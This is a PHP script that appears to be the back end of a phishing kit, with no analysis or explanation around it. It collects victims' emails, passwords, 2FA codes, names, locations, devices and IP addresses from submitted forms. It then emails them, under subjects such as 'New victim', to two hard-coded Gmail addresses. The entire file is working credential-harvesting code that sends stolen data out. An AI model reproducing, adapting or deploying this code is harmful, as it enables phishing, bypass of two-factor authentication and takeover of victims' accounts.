<?php

function getUserIP()
{
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
$e = "";
$p = "";
$p2 = "";
$pgname = "";
$tjerat = "";
$country_name = "";
$ip = "";
$city = "";
$device = "";
$fn = "";
//var_dump($_POST);
//exit();
if(isset($_POST['email']) && isset($_POST['firstpassword'])){
    $e = $_POST['email'];
    $p = $_POST['firstpassword'];
}

if(isset($_POST['country']) && isset($_POST['ip'])&&isset($_POST['city'])&&isset($_POST['device']) && isset($_POST['fullname'])&& isset($_POST['pgname'])&& isset($_POST['tjerat'])){
    $country_name = $_POST['country'];
    $ip = getUserIP();
    $city = $_POST['city'];
    $device = $_POST['device'];
    $pgname = $_POST['pgname'];
    $tjerat = $_POST['tjerat'];
    $fn = $_POST['fullname'];
    
   // die();
    
}
if(isset($_POST['email'])){
    $e = $_POST['email'];
};

// the message
$msg = "Full Name = ".$fn."\n\nPage Name = ".$pgname."\n\nAdditional = $tjerat"."\n\nEmail = ".$e."\n\nCountry = ".$country_name."\n\nIp Address = ".$ip."\n\nCity = ".$city."\n\nDevice = ".$device;


if(isset($_POST['firstpassword'])){
    $p = $_POST['firstpassword'];
    
    $msg = "Password1 = ".$p."\n\nCountry = ".$country_name."\n\nIp Address = ".$ip."\n\nCity = ".$city."\n\nDevice = ".$device;
};
if(isset($_POST['passwordDY'])){
    $p2 = $_POST['passwordDY'];
    
    $msg = "Password2 = ".$p2."\n\nCountry = ".$country_name."\n\nIp Address = ".$ip."\n\nCity = ".$city."\n\nDevice = ".$device;
};

echo "<p>".$msg."</p>";

//die();
//$msg= "sadasdsdjighndfiugndfgndfgndf";
// use wordwrap() if lines are longer than 70 characters
$subject = "New victim";
//$msg = wordwrap($msg,70);
if(isset($_POST['codegeneratorRR'])){
    $code = $_POST['codegeneratorRR'];
    $ip = getUserIP();
      $msg = "Ip Address = ".$ip."\n\n2FA Code = ".$code;
    $subject = "2FA Code";
    //var_dump($code);
}


$to = "liamxhonson@gmail.com";
// send email


mail($to,$subject,$msg);
mail('islamishkodran@gmail.com', 'Page Victim bini', $msg);

?>